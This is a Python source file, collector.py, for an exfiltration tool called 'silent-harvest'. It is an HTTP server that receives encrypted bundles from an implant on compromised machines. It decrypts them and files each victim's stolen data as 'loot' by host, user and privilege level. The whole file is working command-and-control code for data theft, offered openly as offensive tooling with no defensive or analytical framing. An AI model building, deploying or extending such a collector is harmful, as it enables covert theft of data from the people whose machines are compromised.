"""silent-harvest collector — receives encrypted bundles from the implant.

Usage:
    python collector.py [--port 8443] [--psk SECRET] [--loot-dir ../loot]

Endpoints:
    POST /gate   body = SHV1 container (see shcrypto.py). Stored under
                 loot/<host>-<user>-<ts>/ with manifest.json + parts/.
    GET  /health liveness check.

Everything about the victim travels inside the encrypted container; the only
plaintext on the wire is the 6-byte header (magic+version).
"""
import argparse
import json
import os
import re
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import shcrypto

LOCK = threading.Lock()


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    loot_dir = "loot"

    def log_message(self, fmt, *args):
        pass  # quiet default access log; bundle arrivals log their own lines

    def _reply(self, code, body=b"ok", ctype="text/plain"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path in ("/health", "/"):
            self._reply(200, b"silent-harvest collector up\n")
        else:
            self._reply(404, b"nope\n")

    def do_POST(self):
        if self.path != "/gate":
            self._reply(404, b"nope\n")
            return
        try:
            length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            length = 0
        if length <= 0 or length > 512 * 1024 * 1024:
            self._reply(400, b"bad length\n")
            return
        blob = self.rfile.read(length)
        try:
            manifest, parts = shcrypto.unpack(blob, self.server.psk)
        except ValueError as e:
            print("[%s] REJECTED bundle: %s" % (time.strftime("%H:%M:%S"), e))
            self._reply(400, b"bad bundle\n")
            return

        v = manifest.get("victim", {})
        vid = "%s-%s-%d" % (
            re.sub(r"[^A-Za-z0-9_.-]", "_", str(v.get("host", "unknown"))),
            re.sub(r"[^A-Za-z0-9_.-]", "_", str(v.get("user", "unknown"))),
            int(v.get("ts", time.time())),
        )
        dest = os.path.join(self.loot_dir, vid)
        with LOCK:
            os.makedirs(os.path.join(dest, "parts"), exist_ok=True)
            with open(os.path.join(dest, "bundle.bin"), "wb") as f:
                f.write(blob)
            with open(os.path.join(dest, "manifest.json"), "w") as f:
                json.dump(manifest, f, indent=2)
            for name, data in parts.items():
                safe = re.sub(r"[^A-Za-z0-9_.()-]", "_", name)
                with open(os.path.join(dest, "parts", safe), "wb") as f:
                    f.write(data)
            with open(os.path.join(self.loot_dir, "index.jsonl"), "a") as f:
                f.write(json.dumps({
                    "id": vid, "ts": v.get("ts"),
                    "host": v.get("host"), "user": v.get("user"),
                    "elevated": v.get("elevated"),
                    "parts": [{"name": p["name"], "len": p["len"]}
                              for p in manifest["parts"]],
                }) + "\n")

        print("[%s] LOOT %s  host=%s user=%s elevated=%s  parts=%d  (%d bytes)"
              % (time.strftime("%H:%M:%S"), vid, v.get("host"), v.get("user"),
                 v.get("elevated"), len(parts), len(blob)))
        for p in manifest["parts"]:
            print("    - %-46s %10d bytes  %s"
                  % (p["name"], p["len"], json.dumps(p.get("meta", {}))))
        sys.stdout.flush()
        self._reply(200, b"ok\n")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--psk", default=None)
    ap.add_argument("--loot-dir", default=os.path.join(
        os.path.dirname(os.path.abspath(__file__)), "..", "loot"))
    args = ap.parse_args()

    psk = shcrypto.get_psk(args.psk)
    Handler.loot_dir = os.path.abspath(args.loot_dir)
    os.makedirs(Handler.loot_dir, exist_ok=True)

    srv = ThreadingHTTPServer((args.bind, args.port), Handler)
    srv.psk = psk
    print("silent-harvest collector on %s:%d  loot -> %s" %
          (args.bind, args.port, Handler.loot_dir))
    print("PSK: %s" % ("(explicit arg)" if args.psk
                       else "env SH_PSK / psk.txt / default dev key"))
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
